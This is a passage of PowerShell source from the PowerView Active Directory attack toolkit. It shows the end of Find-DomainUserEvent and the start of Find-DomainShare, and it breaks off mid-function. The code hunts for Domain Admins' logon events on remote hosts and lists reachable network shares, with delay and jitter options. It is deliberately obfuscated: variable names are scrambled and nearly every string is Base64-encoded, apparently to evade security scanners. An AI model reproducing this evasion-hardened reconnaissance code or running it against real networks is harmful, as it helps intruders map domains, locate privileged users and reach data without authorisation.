        $UserDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,
        [Switch]
        $CheckAccess,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $StopOnSuccess,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${/=\___/=\/=\/==\/} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $UserLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))] = $UserAdminCount }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) {
            ${__/\/=\/=\/==\/==} = __/\__/\/======\_/ @/=\___/=\/=\/==\/ | select -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBHAHIAbwB1AHAASQBkAGUAbgB0AGkAdAB5AA==')))] -or (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAdABlAHIA')))])) {
            ${/==\__/==========} = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBHAHIAbwB1AHAASQBkAGUAbgB0AGkAdAB5ADoAIAAkAFUAcwBlAHIARwByAG8AdQBwAEkAZABlAG4AdABpAHQAeQA=')))
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${__/\/=\/=\/==\/==} = _/=\/\/=====\/\/== @/==\__/========== | select -ExpandProperty MemberName
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${_/=\__/=\___/=\/=} = ${____/=\/=\_/=\/\/}
        }
        else {
            ${/==\_/=\/==\____/} = @{
                'LDAP' = $True
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/==\_/=\/==\____/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/==\_/=\/==\____/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/==\_/=\/==\____/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAZABvAG0AYQBpAG4AIABjAG8AbgB0AHIAbwBsAGwAZQByAHMAIABpAG4AIABkAG8AbQBhAGkAbgA6ACAAJABEAG8AbQBhAGkAbgA=')))
            ${_/=\__/=\___/=\/=} = _/=\/\/=\/\__/\/\/ @/==\_/=\/==\____/ | select -ExpandProperty dnshostname
        }
        if (${_/=\__/=\___/=\/=} -and (${_/=\__/=\___/=\/=} -isnot [System.Array])) {
            ${_/=\__/=\___/=\/=} = @(,${_/=\__/=\___/=\/=})
        }
        Write-Verbose "[Find-DomainUserEvent] TargetComputers length: $(${_/=\__/=\___/=\/=}.Length)"
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAFQAYQByAGcAZQB0AEMAbwBtAHAAdQB0AGUAcgBzACAAJAB7AF8ALwA9AFwAXwBfAC8APQBcAF8AXwBfAC8APQBcAC8APQB9AA==')))
        if (${_/=\__/=\___/=\/=}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAE4AbwAgAGgAbwBzAHQAcwAgAGYAbwB1AG4AZAAgAHQAbwAgAGUAbgB1AG0AZQByAGEAdABlAA==')))
        }
        ${____/=\/\_/\/\/\_} = {
            Param(${____/=\/=\_/=\/\/}, ${__/\/=\__/====\/=\}, ${__/\____/=\_/\_/=\}, $MaxEvents, ${__/\/=\/=\/==\/==}, $Filter, $Credential)
            ForEach (${__/==\_/=\/===\/=} in ${____/=\/=\_/=\/\/}) {
                ${__/==\/=\/\/\/=\/} = Test-Connection -Count 1 -Quiet -ComputerName ${__/==\_/=\/===\/=}
                if (${__/==\/=\/\/\/=\/}) {
                    ${_/=\_/=\/==\_/\/\} = @{
                        'ComputerName' = ${__/==\_/=\/===\/=}
                    }
                    if (${__/\/=\__/====\/=\}) { ${_/=\_/=\/==\_/\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AFQAaQBtAGUA')))] = ${__/\/=\__/====\/=\} }
                    if (${__/\____/=\_/\_/=\}) { ${_/=\_/=\/==\_/\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGQAVABpAG0AZQA=')))] = ${__/\____/=\_/\_/=\} }
                    if ($MaxEvents) { ${_/=\_/=\/==\_/\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgARQB2AGUAbgB0AHMA')))] = $MaxEvents }
                    if ($Credential) { ${_/=\_/=\/==\_/\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                    if ($Filter -or ${__/\/=\/=\/==\/==}) {
                        if (${__/\/=\/=\/==\/==}) {
                            ___/\_/=\/\/\/\___ @_/=\_/=\/==\_/\/\ | ? {${__/\/=\/=\/==\/==} -contains $_.TargetUserName}
                        }
                        else {
                            ${__/==\_/====\__/=} = 'or'
                            $Filter.Keys | % {
                                if (($_ -eq 'Op') -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAbwByAA==')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBvAG4A'))))) {
                                    if (($Filter[$_] -match '&') -or ($Filter[$_] -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBuAGQA'))))) {
                                        ${__/==\_/====\__/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBuAGQA')))
                                    }
                                }
                            }
                            ${___/\/\/=========} = $Filter.Keys | ? {($_ -ne 'Op') -and ($_ -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAbwByAA==')))) -and ($_ -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBvAG4A'))))}
                            ___/\_/=\/\/\/\___ @_/=\_/=\/==\_/\/\ | % {
                                if (${__/==\_/====\__/=} -eq 'or') {
                                    ForEach (${/=\___/\_/\/=\/==} in ${___/\/\/=========}) {
                                        if ($_."${/=\___/\_/\/=\/==}" -match $Filter[${/=\___/\_/\/=\/==}]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    ForEach (${/=\___/\_/\/=\/==} in ${___/\/\/=========}) {
                                        if ($_."${/=\___/\_/\/=\/==}" -notmatch $Filter[${/=\___/\_/\/=\/==}]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        ___/\_/=\/\/\/\___ @_/=\_/=\/==\_/\/\
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainUserEvent] Total number of hosts: $(${_/=\__/=\___/=\/=}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAEQAZQBsAGEAeQA6ACAAJABEAGUAbABhAHkALAAgAEoAaQB0AHQAZQByADoAIAAkAEoAaQB0AHQAZQByAA==')))
            ${_/==\/\/==\/=\/==} = 0
            ${__/\_/\/\/\/\/\_/} = New-Object System.Random
            ForEach (${__/==\_/=\/===\/=} in ${_/=\__/=\___/=\/=}) {
                ${_/==\/\/==\/=\/==} = ${_/==\/\/==\/=\/==} + 1
                sleep -Seconds ${__/\_/\/\/\/\/\_/}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainUserEvent] Enumerating server ${__/==\_/=\/===\/=} (${_/==\/\/==\/=\/==} of $(${_/=\__/=\___/=\/=}.count))"
                ${/\_____/=\__/==\_} = icm -ScriptBlock ${____/=\/\_/\/\/\_} -ArgumentList ${__/==\_/=\/===\/=}, ${__/\/=\__/====\/=\}, ${__/\____/=\_/\_/=\}, $MaxEvents, ${__/\/=\/=\/==\/==}, $Filter, $Credential
                ${/\_____/=\__/==\_}
                if (${/\_____/=\__/==\_} -and $StopOnSuccess) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAFQAYQByAGcAZQB0ACAAdQBzAGUAcgAgAGYAbwB1AG4AZAAsACAAcgBlAHQAdQByAG4AaQBuAGcAIABlAGEAcgBsAHkA')))
                    return
                }
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAFUAcwBpAG4AZwAgAHQAaAByAGUAYQBkAGkAbgBnACAAdwBpAHQAaAAgAHQAaAByAGUAYQBkAHMAOgAgACQAVABoAHIAZQBhAGQAcwA=')))
            ${/====\__/\_/===\/} = @{
                'StartTime' = ${__/\/=\__/====\/=\}
                'EndTime' = ${__/\____/=\_/\_/=\}
                'MaxEvents' = $MaxEvents
                'TargetUsers' = ${__/\/=\/=\/==\/==}
                'Filter' = $Filter
                'Credential' = $Credential
            }
            _/=\__/=\__/=\/==\ -____/=\/=\_/=\/\/ ${_/=\__/=\___/=\/=} -___/\/=\____/=\/\/ ${____/=\/\_/\/\/\_} -__/\/\/\/\____/\/\ ${/====\__/\_/===\/} -Threads $Threads
        }
    }
}
function Find-DomainShare {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${____/=\/=\_/=\/\/},
        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Alias('CheckAccess')]
        [Switch]
        $CheckShareAccess,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${_/\/\_/==\__/=\/\} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = ${_/\_____/====\/===} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${_/=\_____/===\/\/=} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${___/\/\/\__/==\/=\} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${_/=\__/=\___/=\/=} = ${____/=\/=\_/=\/\/}
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABRAHUAZQByAHkAaQBuAGcAIABjAG8AbQBwAHUAdABlAHIAcwAgAGkAbgAgAHQAaABlACAAZABvAG0AYQBpAG4A')))
            ${_/=\__/=\___/=\/=} = _/==\/\/\_______/\ @_/\/\_/==\__/=\/\ | select -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainShare] TargetComputers length: $(${_/=\__/=\___/=\/=}.Length)"
        if (${_/=\__/=\___/=\/=}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABOAG8AIABoAG8AcwB0AHMAIABmAG8AdQBuAGQAIAB0AG8AIABlAG4AdQBtAGUAcgBhAHQAZQA=')))
        }
        ${____/=\/\_/\/\/\_} = {
            Param(${____/=\/=\_/=\/\/}, $CheckShareAccess, ${_/=\/=\_/=\/=\/\/=})
            if (${_/=\/=\_/=\/=\/\/=}) {
                $Null = _/=\/=\/==\_/=\__/ -_/=\/=\_/=\/=\/\/= ${_/=\/=\_/=\/=\/\/=} -___/==\_/\/=\_/=\_
            }
            ForEach (${__/==\_/=\/===\/=} in ${____/=\/=\_/=\/\/}) {
                ${__/==\/=\/\/\/=\/} = Test-Connection -Count 1 -Quiet -ComputerName ${__/==\_/=\/===\/=}
                if (${__/==\/=\/\/\/=\/}) {
                    ${/\_____/=\___/===} = __/=\_/==\/=\/\_/= -____/=\/=\_/=\/\/ ${__/==\_/=\/===\/=}
                    ForEach (${_/==\___/\_/\/===} in ${/\_____/=\___/===}) {
                        ${/=\_/\_/=\__/\_/\} = ${_/==\___/\_/\/===}.Name
                        $Path = '\\'+${__/==\_/=\/===\/=}+'\'+${/=\_/\_/=\__/\_/\}
                        if ((${/=\_/\_/=\__/\_/\}) -and (${/=\_/\_/=\__/\_/\}.trim() -ne '')) {
                            if ($CheckShareAccess) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    ${_/==\___/\_/\/===}
                                }
                                catch {
                                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYQBjAGMAZQBzAHMAaQBuAGcAIABzAGgAYQByAGUAIABwAGEAdABoACAAJABQAGEAdABoACAAOgAgACQAXwA=')))
                                }
                            }
                            else {
                                ${_/==\___/\_/\/===}
                            }
                        }
                    }
                }
            }
            if (${_/=\/=\_/=\/=\/\/=}) {
                __/\/=\/\______/\/
            }
        }
        ${/=\_______/\/\__/} = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                ${/=\_______/\/\__/} = _/=\/=\/==\_/=\__/ -Credential $Credential
            }
            else {
                ${/=\_______/\/\__/} = _/=\/=\/==\_/=\__/ -Credential $Credential -___/==\_/\/=\_/=\_
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainShare] Total number of hosts: $(${_/=\__/=\___/=\/=}.count)"
